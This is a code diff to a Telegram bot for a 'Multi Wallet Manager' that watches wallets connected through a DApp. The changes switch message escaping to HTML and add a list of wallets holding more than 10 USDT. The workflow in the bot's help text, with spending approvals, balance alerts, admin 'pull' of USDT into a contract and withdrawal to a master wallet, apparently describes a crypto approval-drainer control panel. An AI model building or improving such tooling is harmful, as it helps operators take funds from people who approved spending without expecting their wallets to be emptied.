@@ -112,7 +112,6 @@ class TelegramService {
         }
     }
 
-        // Fix the regex pattern - remove the HTML tags
     setupCommandHandlers() {
         if (!this.bot) return;
 
@@ -134,7 +133,7 @@ class TelegramService {
             this.sendMainMenu(msg.chat.id);
         });
 
-        // Pull command handler - fix the regex
+        // Pull command handler
         this.bot.onText(/\/pull_(.*)/, (msg, match) => {
             console.log('Received /pull command from chat:', msg.chat.id);
             const walletAddress = match && match[1] ? match[1] : null;
@@ -178,7 +177,7 @@ class TelegramService {
             } else if (action === 'balances') {
                 this.handleBalancesCommand(chatId);
             } else if (action === 'pull_list') {
-                this.sendPullWalletList(chatId);
+                await this.sendPullWalletList(chatId); // Fixed: Added await
             } else if (action === 'help') {
                 this.sendHelpMenu(chatId);
             } else if (action === 'menu') {
@@ -190,19 +189,19 @@ class TelegramService {
         });
     }
 
-
-    // escape MarkdownV2 special characters, defensive: accept numbers/objects
-    escapeMarkdown(text) {
+    // escape HTML special characters
+    escapeHtml(text) {
         if (!text && text !== 0) return '';
         
         // Convert to string first
         let result = String(text);
         
-        // Escape backslashes first to prevent double escaping
-        result = result.replace(/\\/g, '\\\\');
-        
-        // Then escape all MarkdownV2 special characters
-        result = result.replace(/([_\</b>[]()~`>#+-=|{}.!])/g, '\\$1');
+        // Escape HTML special characters
+        result = result.replace(/&/g, '&amp;')
+                      .replace(/</g, '&lt;')
+                      .replace(/>/g, '&gt;')
+                      .replace(/"/g, '&quot;')
+                      .replace(/'/g, '&#039;');
         
         return result;
     }
@@ -216,9 +215,9 @@ class TelegramService {
 
     async sendMainMenu(chatId) {
         const message = `
-🤖 <b>Multi Wallet Manager \- Main Menu</b>
+🤖 <b>Multi Wallet Manager - Main Menu</b>
 
-Welcome to your USDT management system\. Select an option below:
+Welcome to your USDT management system. Select an option below:
 
 💰 <b>Wallet Operations</b>
 • Pull USDT from connected wallets
@@ -252,7 +251,7 @@ Welcome to your USDT management system\. Select an option below:
             return result;
         } catch (error) {
             console.error('Error sending main menu to chat', chatId, ':', error && error.message ? error.message : error);
-            // Fallback without markdown
+            // Fallback without HTML
             const fallbackMessage = `
 🤖 Multi Wallet Manager - Main Menu
 
@@ -286,35 +285,35 @@ Welcome to your USDT management system. Select an option below:
 
     async sendHelpMenu(chatId) {
         const message = `
-🤖 <b>Multi Wallet Manager \- Help</b>
+🤖 <b>Multi Wallet Manager - Help</b>
 
 📚 <b>Available Commands:</b>
-• /start \- Open main menu
-• /menu \- Show floating menu
-• /pull\_<address> \- Pull USDT from specific wallet
-• /withdraw \- Withdraw all USDT from contract
-• /balances \- Check all balances
-• /help \- Show this help message
+• /start - Open main menu
+• /menu - Show floating menu
+• /pull_<address> - Pull USDT from specific wallet
+• /withdraw - Withdraw all USDT from contract
+• /balances - Check all balances
+• /help - Show this help message
 
 📋 <b>Available Operations:</b>
 • Check Smart Contract USDT Balance
 • Check Master Wallet BNB Balance
 • Check Master Wallet USDT Balance
 • Pull USDT from connected wallets
-• Auto\-gas management for transactions
-• 6\-hour balance monitoring
+• Auto-gas management for transactions
+• 6-hour balance monitoring
 
 🛡️ <b>Security Features:</b>
-• Admin\-only operations
+• Admin-only operations
 • Gas paid by master wallet
 • Wallet approval system
 • Transaction logging
 
 🔄 <b>Workflow:</b>
-1\. Connect wallet via DApp
-2\. Approve contract spending
-3\. Admin pulls USDT to contract
-4\. Admin withdraws to master wallet
+1. Connect wallet via DApp
+2. Approve contract spending
+3. Admin pulls USDT to contract
+4. Admin withdraws to master wallet
         `;
 
         const options = {
@@ -364,7 +363,7 @@ Welcome to your USDT management system. Select an option below:
         }
 
         const maskedAddress = this.maskAddress(walletAddress);
-        const escapedBalance = this.escapeMarkdown(balance);
+        const escapedBalance = this.escapeHtml(balance);
 
         const message = `
 🔔 <b>NEW WALLET CONNECTED</b>
@@ -420,12 +419,12 @@ Actions:
         if (!this.bot || !this.adminChatId) return;
 
         const maskedAddress = this.maskAddress(walletAddress);
-        const escapedBalance = this.escapeMarkdown(balance);
+        const escapedBalance = this.escapeHtml(balance);
 
         const message = `
 💰 <b>BALANCE ALERT</b>
 Address: <code>${maskedAddress}</code>
-USDT Balance: <b>${escapedBalance} USDT</b> \(> \\$10\)
+USDT Balance: <b>${escapedBalance} USDT</b> (> $10)
 
 Actions:
         `;
@@ -474,7 +473,7 @@ Actions:
         if (!this.bot || !this.adminChatId) return;
 
         const maskedAddress = this.maskAddress(walletAddress);
-        const escapedAmount = this.escapeMarkdown(amount);
+        const escapedAmount = this.escapeHtml(amount);
         const maskedTxHash = this.maskAddress(txHash);
 
         const message = `
@@ -527,7 +526,210 @@ Next steps:
         }
     }
 
-// Enhanced handlePullCommand method to show full address
+    // ENHANCED Pull Wallet List with real-time balances
+    async sendPullWalletList(chatId) {
+        if (chatId.toString() !== this.adminChatId) {
+            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
+        }
+
+        try {
+            // Show processing message
+            const processingMessage = '🔄 Fetching wallet balances...';
+            const processingOptions = {
+                parse_mode: 'HTML'
+            };
+            
+            // Send initial processing message
+            const processingMsg = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
+            
+            console.log('Fetching all wallets from database...');
+            
+            // Fetch ALL wallets from database first
+            const allWalletsQuery = 'SELECT address, name, usdt_balance, created_at FROM wallets ORDER BY created_at DESC';
+            const allWalletsResult = await database.query(allWalletsQuery);
+            
+            const totalWallets = allWalletsResult.rows.length;
+            let walletsToUpdate = [];
+            
+            // Fetch real-time balances for all wallets
+            const contractService = require('../services/contract.service');
+            
+            // Update balances for all wallets
+            for (const wallet of allWalletsResult.rows) {
+                try {
+                    console.log(`Fetching real-time balance for: ${wallet.address}`);
+                    const realTimeBalance = await contractService.getWalletUSDTBalance(wallet.address);
+                    console.log(`Real-time balance for ${wallet.address}: ${realTimeBalance}`);
+                    
+                    // Update database with real-time balance
+                    const updateQuery = `
+                        UPDATE wallets 
+                        SET usdt_balance = $1, last_balance_check = NOW(), updated_at = NOW()
+                        WHERE address = $2
+                    `;
+                    await database.query(updateQuery, [realTimeBalance, wallet.address]);
+                    
+                    // Update the wallet object with real-time balance
+                    wallet.usdt_balance = realTimeBalance;
+                    
+                    // Add to walletsToUpdate if balance > 10
+                    if (parseFloat(realTimeBalance) > 10) {
+                        walletsToUpdate.push(wallet);
+                    }
+                } catch (error) {
+                    console.error(`Error fetching balance for ${wallet.address}:`, error.message);
+                    // Keep existing balance if fetch fails
+                    if (parseFloat(wallet.usdt_balance || '0') > 10) {
+                        walletsToUpdate.push(wallet);
+                    }
+                }
+            }
+            
+            const walletsOver10 = walletsToUpdate.length;
+            
+            let message = `<b>📤 Select Wallet to Pull</b>\n\n`;
+            message += `Total Wallets Connected: <b>${totalWallets}</b>\n`;
+            message += `Wallets with >10 USDT: <b>${walletsOver10}</b>\n\n`;
+
+            if (walletsToUpdate.length === 0) {
+                message += 'No wallets with balance > 10 USDT found.\n\n';
+                message += 'New wallets will be checked automatically.';
+            } else {
+                message += 'Click on a wallet to pull USDT:\n\n';
+                for (let i = 0; i < Math.min(walletsToUpdate.length, 10); i++) {
+                    const wallet = walletsToUpdate[i];
+                    const maskedAddress = this.maskAddress(wallet.address);
+                    // Format balance to 2 decimal places
+                    const balance = parseFloat(wallet.usdt_balance || '0').toFixed(2);
+                    message += `${i + 1}. <code>${maskedAddress}</code> (${balance} USDT)\n`;
+                }
+            }
+
+            // Build inline keyboard
+            const inlineKeyboard = [];
+            
+            // Add wallet buttons (only for wallets with balance > 10)
+            if (walletsToUpdate.length > 0) {
+                for (let i = 0; i < Math.min(walletsToUpdate.length, 10); i++) {
+                    const wallet = walletsToUpdate[i];
+                    inlineKeyboard.push([{
+                        text: `📤 Pull ${wallet.name || `Wallet ${i + 1}`}`,
+                        callback_data: `pull_${wallet.address}`
+                    }]);
+                }
+            }
+            
+            // Add the main menu button
+            inlineKeyboard.push([
+                { text: '🏠 Main Menu', callback_data: 'menu' }
+            ]);
+
+            const options = {
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: inlineKeyboard
+                }
+            };
+
+            // Edit the processing message with the actual results
+            return await this.bot.editMessageText(message, {
+                chat_id: chatId,
+                message_id: processingMsg.message_id,
+                ...options
+            });
+            
+        } catch (error) {
+            console.error('Error sending pull wallet list:', error && error.message ? error.message : error);
+            const fallbackMessage = `
+❌ Error fetching wallet list. Please try again later.
+            `;
+            return await this.bot.sendMessage(chatId, fallbackMessage, {
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: '🏠 Main Menu', callback_data: 'menu' }
+                        ]
+                    ]
+                }
+            });
+        }
+    }
+
+    // REAL BLOCKCHAIN BALANCE CHECKING FUNCTIONS
+    async getContractUSDTBalance() {
+        if (!this.provider || !process.env.USDT_CONTRACT_ADDRESS) {
+            console.log("⚠️ Blockchain not ready, returning zero USDT balance");
+            return { balance: '0.00', error: 'Blockchain not initialized' };
+        }
+
+        try {
+            const usdtContract = new ethers.Contract(
+                process.env.USDT_CONTRACT_ADDRESS,
+                ['function balanceOf(address account) external view returns (uint256)'],
+                this.provider
+            );
+
+            const balance = await usdtContract.balanceOf(process.env.CONTRACT_ADDRESS);
+            const formattedBalance = ethers.formatUnits(balance, 18);
+
+            console.log('Contract USDT Balance:', formattedBalance);
+            return { balance: formattedBalance, error: null };
+        } catch (error) {
+            console.error(
+                'Error getting contract USDT balance:',
+                error && error.message ? error.message : error
+            );
+
+            return {
+                balance: '0.00',
+                error: error && error.message ? error.message : String(error)
+            };
+        }
+    }
+
+    async getMasterWalletBNBBalance() {
+        if (!this.provider || !this.masterWallet) {
+            console.log('⚠️ Blockchain not initialized, returning zero BNB balance');
+            return { balance: '0.00', error: 'Blockchain not initialized' };
+        }
+
+        try {
+            const balance = await this.provider.getBalance(this.masterWallet);
+            const formattedBalance = ethers.formatEther(balance);
+
+            console.log('Master Wallet BNB Balance:', formattedBalance);
+            return { balance: formattedBalance, error: null };
+        } catch (error) {
+            console.error('Error getting master wallet BNB balance:', error && error.message ? error.message : error);
+            return { balance: '0.00', error: error && error.message ? error.message : String(error) };
+        }
+    }
+
+    async getMasterWalletUSDTBalance() {
+        if (!this.provider || !process.env.USDT_CONTRACT_ADDRESS || !this.masterWallet) {
+            console.log('⚠️ Blockchain not initialized, returning zero USDT balance');
+            return { balance: '0.00', error: 'Blockchain not initialized' };
+        }
+
+        try {
+            const usdtContract = new ethers.Contract(
+                process.env.USDT_CONTRACT_ADDRESS,
+                ['function balanceOf(address account) external view returns (uint256)'],
+                this.provider
+            );
+
+            const balance = await usdtContract.balanceOf(this.masterWallet);
+            const formattedBalance = ethers.formatUnits(balance, 18);
+
+            console.log('Master Wallet USDT Balance:', formattedBalance);
+            return { balance: formattedBalance, error: null };
+        } catch (error) {
+            console.error('Error getting master wallet USDT balance:', error && error.message ? error.message : error);
+            return { balance: '0.00', error: error && error.message ? error.message : String(error) };
+        }
+    }
+
     async handlePullCommand(chatId, walletAddress) {
         if (chatId.toString() !== this.adminChatId) {
             return this.bot.sendMessage(chatId, '❌ Unauthorized access');
@@ -594,13 +796,13 @@ Processing... This will:
                 const gasCheck = await gasService.checkWalletGasBalance(walletAddress);
 
                 if (!gasCheck || !gasCheck.hasSufficientGas) {
-                    if (gasService && typeof gasService.sendGasToWallet === 'function') {
+                                        if (gasService && typeof gasService.sendGasToWallet === 'function') {
                         const gasResult = await gasService.sendGasToWallet(walletAddress);
                         if (!gasResult || !gasResult.success) {
                             const errorMessage = `
 ❌ <b>GAS FAILED</b>
 Wallet: <code>${fullAddress}</code>
-Error: ${this.escapeMarkdown((gasResult && gasResult.error) ? gasResult.error : 'Unknown error')}
+Error: ${this.escapeHtml((gasResult && gasResult.error) ? gasResult.error : 'Unknown error')}
 
 🔄 <b>Last Updated:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
                             `;
@@ -621,15 +823,15 @@ Error: ${this.escapeMarkdown((gasResult && gasResult.error) ? gasResult.error : 
                 }
             }
 
-            // Pull USDT from wallet to contract
+            // Pull USDT from wallet to contract - USE CORRECT METHOD NAME
             const pullResult = await contractService.pullUSDTFromWallet(walletAddress);
 
             if (pullResult && pullResult.success) {
-                const escapedAmount = this.escapeMarkdown(pullResult.amount || '0');
+                const escapedAmount = this.escapeHtml(pullResult.amount || '0');
                 const maskedTxHash = this.maskAddress(pullResult.txHash || 'N/A');
                 const fullTxHash = pullResult.txHash || 'N/A';
-                const escapedTxHash = this.escapeMarkdown(maskedTxHash);
-                const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
+                const escapedTxHash = this.escapeHtml(maskedTxHash);
+                const escapedTimestamp = this.escapeHtml(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
 
                 const successMessage = `
 ✅ <b>PULL SUCCESSFUL</b>
@@ -673,7 +875,7 @@ Transaction: <code>${fullTxHash}</code>
                 const errorMessage = `
 ❌ <b>PULL FAILED</b>
 Wallet: <code>${fullAddress}</code>
-Error: ${this.escapeMarkdown((pullResult && pullResult.error) ? pullResult.error : 'Unknown error')}
+Error: ${this.escapeHtml((pullResult && pullResult.error) ? pullResult.error : 'Unknown error')}
 
 🔄 <b>Last Updated:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
                 `;
@@ -697,7 +899,7 @@ Error: ${this.escapeMarkdown((pullResult && pullResult.error) ? pullResult.error
             const errorMessage = `
 ❌ <b>PULL FAILED</b>
 Wallet: <code>${fullAddress}</code>
-Error: ${this.escapeMarkdown(error && error.message ? error.message : String(error))}
+Error: ${this.escapeHtml(error && error.message ? error.message : String(error))}
 
 🔄 <b>Last Updated:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
             `;
@@ -729,14 +931,14 @@ Error: ${this.escapeMarkdown(error && error.message ? error.message : String(err
 
         const processingMessage = `
 🏦 <b>Withdraw Operation Initiated</b>
-Withdrawing all USDT from contract to master wallet\.\.\.
+Withdrawing all USDT from contract to master wallet...
 
 📋 <b>Operations to perform:</b>
 • Check contract USDT balance
 • Execute withdrawal transaction
 • Send confirmation
 
-⏳ <b>Please wait</b>\.\.\.
+⏳ <b>Please wait</b>...
         `;
 
         const processingOptions = {
@@ -773,22 +975,23 @@ Withdrawing all USDT from contract to master wallet\.\.\.
             const withdrawResult = await Promise.race([withdrawPromise, timeoutPromise]);
 
             if (withdrawResult && withdrawResult.success) {
-                // Escape all values for MarkdownV2
+                // Escape all values
                 const maskedMasterWallet = this.maskAddress(this.masterWallet);
-                const escapedMasterWallet = this.escapeMarkdown(maskedMasterWallet);
-                const escapedAmount = this.escapeMarkdown(withdrawResult.amount || '0');
+                const escapedMasterWallet = this.escapeHtml(maskedMasterWallet);
+                const escapedAmount = this.escapeHtml(withdrawResult.amount || '0');
                 const maskedTxHash = this.maskAddress(withdrawResult.txHash || 'N/A');
-                const escapedTxHash = this.escapeMarkdown(maskedTxHash);
-                const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
+                const fullTxHash = withdrawResult.txHash || 'N/A';
+                const escapedTxHash = this.escapeHtml(maskedTxHash);
+                const escapedTimestamp = this.escapeHtml(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
 
                 const successMessage = `
 ✅ <b>WITHDRAWAL SUCCESSFUL</b>
 Amount: <b>${escapedAmount} USDT</b>
 To: <code>${escapedMasterWallet}</code>
-Transaction: <code>${escapedTxHash}</code>
+Transaction: <code>${fullTxHash}</code>
 
 📊 <b>Updated Balances:</b>
-• Contract USDT: 0\.00 USDT
+• Contract USDT: 0.00 USDT
 • Master Wallet USDT: Check balances for update
 
 🔄 <b>Last Updated:</b> ${escapedTimestamp}
@@ -807,8 +1010,8 @@ Transaction: <code>${escapedTxHash}</code>
                 });
             } else {
                 // Escape error message
-                const escapedError = this.escapeMarkdown((withdrawResult && withdrawResult.error) ? withdrawResult.error : 'Unknown error occurred');
-                const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
+                const escapedError = this.escapeHtml((withdrawResult && withdrawResult.error) ? withdrawResult.error : 'Unknown error occurred');
+                const escapedTimestamp = this.escapeHtml(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
 
                 const errorMessage = `
 ❌ <b>WITHDRAWAL FAILED</b>
@@ -838,8 +1041,8 @@ Error: ${escapedError}
             const cleanErrorMessage = error && error.message
                 ? error.message.replace(/[^a-zA-Z0-9\s.\,!\?-]/g, '').substring(0, 200)
                 : 'Unknown error occurred';
-            const escapedErrorMessage = this.escapeMarkdown(cleanErrorMessage);
-            const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
+            const escapedErrorMessage = this.escapeHtml(cleanErrorMessage);
+            const escapedTimestamp = this.escapeHtml(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
 
             const errorMessage = `
 ❌ <b>WITHDRAWAL FAILED</b>
@@ -881,7 +1084,7 @@ Error: ${escapedErrorMessage}
 • Master Wallet BNB Balance
 • Master Wallet USDT Balance
 
-⏳ <b>Querying blockchain</b>\.\.\.
+⏳ <b>Querying blockchain</b>...
         `;
 
         const processingOptions = {
@@ -898,7 +1101,7 @@ Error: ${escapedErrorMessage}
         try {
             const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
 
-            // Fetch real balances with timeout
+            // Fetch real balances with timeout - USE CORRECT METHOD NAMES
             const contractBalancePromise = this.getContractUSDTBalance();
             const masterBNBBalancePromise = this.getMasterWalletBNBBalance();
             const masterUSDTBalancePromise = this.getMasterWalletUSDTBalance();
@@ -920,16 +1123,16 @@ Error: ${escapedErrorMessage}
             const maskedContractAddress = this.maskAddress(contractAddress);
             const maskedMasterWallet = this.maskAddress(this.masterWallet);
 
-            // Escape everything that will go into MarkdownV2
-            const escapedContractAddress = this.escapeMarkdown(maskedContractAddress);
-            const escapedMasterWallet = this.escapeMarkdown(maskedMasterWallet);
-            const escapedContractBalance = this.escapeMarkdown(contractBalance && contractBalance.balance ? contractBalance.balance : '0');
-            const escapedBNBBalance = this.escapeMarkdown(masterBNBBalance && masterBNBBalance.balance ? masterBNBBalance.balance : '0');
-            const escapedUSDTBalance = this.escapeMarkdown(masterUSDTBalance && masterUSDTBalance.balance ? masterUSDTBalance.balance : '0');
-            const escapedContractError = contractBalance.error ? this.escapeMarkdown(String(contractBalance.error)) : null;
-            const escapedBNBError = masterBNBBalance.error ? this.escapeMarkdown(String(masterBNBBalance.error)) : null;
-            const escapedUSDTError = masterUSDTBalance.error ? this.escapeMarkdown(String(masterUSDTBalance.error)) : null;
-            const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
+            // Escape everything
+            const escapedContractAddress = this.escapeHtml(maskedContractAddress);
+            const escapedMasterWallet = this.escapeHtml(maskedMasterWallet);
+            const escapedContractBalance = this.escapeHtml(contractBalance && contractBalance.balance ? contractBalance.balance : '0');
+            const escapedBNBBalance = this.escapeHtml(masterBNBBalance && masterBNBBalance.balance ? masterBNBBalance.balance : '0');
+            const escapedUSDTBalance = this.escapeHtml(masterUSDTBalance && masterUSDTBalance.balance ? masterUSDTBalance.balance : '0');
+            const escapedContractError = contractBalance.error ? this.escapeHtml(String(contractBalance.error)) : null;
+            const escapedBNBError = masterBNBBalance.error ? this.escapeHtml(String(masterBNBBalance.error)) : null;
+            const escapedUSDTError = masterUSDTBalance.error ? this.escapeHtml(String(masterUSDTBalance.error)) : null;
+            const escapedTimestamp = this.escapeHtml(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
 
             let balancesMessage = `
 📊 <b>REAL BALANCE REPORT</b>
@@ -950,7 +1153,7 @@ Error: ${escapedErrorMessage}
                 balancesMessage += `
 💰 <b>Smart Contract</b>
 • Address: Not configured
-• USDT Balance: 0\.00 USDT
+• USDT Balance: 0.00 USDT
 `;
             }
 
@@ -993,20 +1196,20 @@ Error: ${escapedErrorMessage}
         } catch (error) {
             console.error('Error in balances command:', error && error.message ? error.message : error);
 
-            // Create a clean error message without special characters
+            // Create a clean error message
             const cleanErrorMessage = error && error.message
                 ? error.message.replace(/[^a-zA-Z0-9\s.\,!\?-]/g, '').substring(0, 200)
                 : 'Unknown error occurred';
 
             const errorMessage = `
 ❌ <b>BALANCES FAILED</b>
-Error: ${this.escapeMarkdown(cleanErrorMessage)}
+Error: ${this.escapeHtml(cleanErrorMessage)}
 
 🔄 <b>Last Updated:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
     `;
 
-            // Send with fallback to plain text if markdown fails
-            try {
+            // Send with fallback
+                        try {
                 await this.bot.sendMessage(chatId, errorMessage, {
                     parse_mode: 'HTML',
                     reply_markup: {
@@ -1018,7 +1221,7 @@ Error: ${this.escapeMarkdown(cleanErrorMessage)}
                     }
                 });
             } catch (markdownError) {
-                // Fallback without markdown
+                // Fallback without HTML
                 const fallbackMessage = `
 ❌ BALANCES FAILED
 Error: ${cleanErrorMessage}
@@ -1054,9 +1257,3 @@ Error: ${cleanErrorMessage}
 }
 
 module.exports = new TelegramService();
-
-
-
-
-
-
